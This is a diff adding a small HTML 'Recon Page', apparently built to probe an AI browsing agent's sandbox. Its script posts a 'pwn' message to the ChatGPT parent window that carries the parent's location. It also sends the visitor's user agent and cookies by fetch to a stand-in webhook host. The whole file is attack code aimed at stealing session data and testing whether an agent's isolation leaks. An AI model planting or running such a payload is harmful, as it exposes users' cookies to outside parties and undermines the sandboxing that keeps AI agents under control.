@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head><title>Recon Page</title></head>
+<body>
+    <h1>Testing Agent Sandbox...</h1>
+    <script>
+        // Attempt to talk to ChatGPT parent window
+        window.parent.postMessage({
+            type: "pwn",
+            location: window.parent.location.href,
+            msg: "If you see this in the console, the sandbox is leaky."
+        }, "*");
+
+        // Also log the agent's navigator info to your webhook
+        fetch('https://your-webhook.com/log', {
+            method: 'POST',
+            mode: 'no-cors',
+            body: JSON.stringify({
+                ua: navigator.userAgent,
+                cookies: document.cookie
+            })
+        });
+    </script>
+</body>
+</html>
